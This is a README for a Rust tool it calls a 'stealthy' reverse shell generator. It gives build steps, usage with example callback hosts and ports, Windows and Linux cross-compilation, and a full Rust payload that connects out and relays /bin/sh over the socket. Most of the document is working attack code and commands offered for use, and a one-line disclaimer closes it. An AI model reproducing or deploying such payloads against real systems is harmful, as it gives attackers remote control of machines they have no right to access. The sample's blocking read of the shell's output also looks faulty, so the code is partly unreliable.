# Foxhole

A stealthy, cross-platform reverse shell generator written in Rust.

## Features

- Cross-platform support (Linux and Windows)
- TLS encryption support
- Customizable shell path
- Minimal and fast binaries
- Release mode compilation for smaller size

## Installation

```bash
git clone https://github.com/ArsCodeAmatoria/foxhole.git
cd foxhole
cargo build --release
```

## Usage

```bash
foxhole --ip <target_ip> --port <target_port> --os <linux|windows> [--shell <shell_path>] [--tls] --output <output_path>
```

### Command Line Arguments

- `--ip`: Target IP address or hostname
- `--port`: Target port number
- `--os`: Target operating system (linux or windows)
- `--shell`: Custom shell path (optional)
- `--tls`: Enable TLS encryption
- `--output`: Output binary path

### Examples

Basic Linux reverse shell:
```bash
foxhole --ip 192.168.1.100 --port 4444 --os linux --output shell
```

Windows reverse shell with TLS:
```bash
foxhole --ip example.com --port 443 --os windows --tls --output shell.exe
```

Custom shell path:
```bash
foxhole --ip 192.168.1.100 --port 4444 --os linux --shell /bin/bash --output shell
```

### Generated Shell Code Example

```rust
use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};

fn main() -> io::Result<()> {
    let addr = "192.168.1.100:4444";
    let stream = TcpStream::connect(addr)?;
    let mut stream = stream;

    let mut child = Command::new("/bin/sh")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;

    let mut buffer = [0; 1024];
    loop {
        let n = stream.read(&mut buffer)?;
        if n == 0 { break; }
        
        child.stdin.as_mut().unwrap().write_all(&buffer[..n])?;
        child.stdin.as_mut().unwrap().flush()?;
        
        let mut output = String::new();
        child.stdout.as_mut().unwrap().read_to_string(&mut output)?;
        stream.write_all(output.as_bytes())?;
        stream.flush()?;
    }
    Ok(())
}
```

## Requirements

- Rust toolchain (latest stable)
- `rustc` compiler
- For cross-compilation: `cross` (optional)

## Building for Different Platforms

### Linux to Windows Cross-Compilation

```bash
cross build --release --target x86_64-pc-windows-msvc
```

### Windows to Linux Cross-Compilation

```bash
cross build --release --target x86_64-unknown-linux-gnu
```

## Security Note

This tool is for educational and authorized testing purposes only. Unauthorized use on systems you don't own or have permission to test is illegal. 